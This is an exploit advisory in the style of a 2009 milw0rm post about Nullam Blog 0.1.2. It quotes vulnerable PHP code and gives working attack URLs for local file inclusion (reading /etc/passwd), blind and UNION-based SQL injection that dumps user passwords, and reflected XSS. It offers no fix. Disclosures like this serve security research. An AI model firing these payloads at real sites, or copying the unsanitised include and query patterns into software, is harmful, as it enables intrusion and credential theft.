@@ -1,0 +1,153 @@
+-- 
+Salvatore Fresta aka drosophila
+CWNP444351
+******** Salvatore "drosophila" Fresta ********
+
+[+] Application: Nullam Blog
+[+] Version: 0.1.2
+[+] Website: http://nullam.net/
+
+[+] Bugs: [A] Local File Inclusion
+[B] File Disclosure
+[C] Multiple Blind SQL Injection
+[D] SQL Injection
+[E] Reflected XSS
+
+[+] Exploitation: Remote
+[+] Date: 10 Sep 2009
+
+[+] Discovered by: Salvatore Fresta aka drosophila
+[+] Author: Salvatore Fresta aka drosophila
+[+] E-mail: drosophilaxxx [at] gmail.com
+
+***************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+***************************************************
+
+[+] Bugs
+
+The following flaws are tested on version 0.1.2.
+Other versions may also be affected.
+
+- [A] Local File Inclusion
+
+[-] Risk: high
+[-] File affected: index.php
+
+This bug allows a guest to include a local file.
+
+...
+
+$static = false;
+
+if(!isset($_GET['p'])) {
+
+$include = "./pages/news.php";
+
+} else {
+
+$include = "./pages/" . $_GET['p'] . ".php";
+
+}
+
+...
+
+if(!$static) {
+include($include);
+}
+
+...
+
+- [B] File Disclosure
+
+[-] Risk: medium
+[-] File affected: index.php
+
+This bug allows a guest to view the content of a
+local file.
+
+...
+
+if(isset($_GET['s'])) {
+$static = true;
+$include = "./pages/custom/" . $_GET['s'] . ".html";
+}
+
+...
+
+if(!$static) {
+include($include);
+} else {
+$pageSmarty = new Smarty;
+$pageSmarty->assign('html', file_get_contents($include));
+
+...
+
+- [C] Blind SQL Injection
+
+[-] Risk: medium
+[-] File affected: news.php, register.php
+
+These bugs allows a guest to inject SQL statements
+into the affected queries.
+
+- [D] SQL Injection
+
+[-] Risk: high
+[-] File affected: register.php
+
+This bug allows a guest to inject SQL statements
+into the affected query.
+
+...
+
+$result = mysql_query(sprintf("SELECT `uname`,`verified` FROM `users` WHERE `verifyHash`='%s' LIMIT 1;", $_GET['v'])) or die(mysql_error());
+if(mysql_numrows($result) != 1) {
+$msg = "Invalid verification hash! If you followed the link you received in your email please contact an admin and request a new verification email.";
+} else {
+$msg = "User " . mysql_result($result, 0, 'uname') . " successfully verified! you may now login using the form on the main page!";
+}
+
+...
+
+***************************************************
+
+[+] Code
+
+- [A] Local File Inclusion
+
+http://site/path/index.php?p=../../../../../../etc/passwd%00
+
+- [B] File Disclosure
+
+http://site/path/index.php?s=../../../../../../../etc/passwd%00
+
+- [C] Multiple Blind SQL Injection
+
+http://site/path/index.php?y=1&i=%25-1%25' OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23
+
+http://site/path/index.php?p=register&v=1' OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23
+
+- [D] SQL Injection
+
+http://site/path/index.php?p=register&v=-1' UNION ALL SELECT GROUP_CONCAT(uname,0x3a,passwd),2 FROM users%23
+
+- [E] Reflected XSS
+
+http://site/path/index.php?p=error&e=<script>alert('XSS');</script>
+
+***************************************************
+
+[+] Fix
+
+No fix.
+
+***************************************************
+
+# milw0rm.com [2009-09-10]
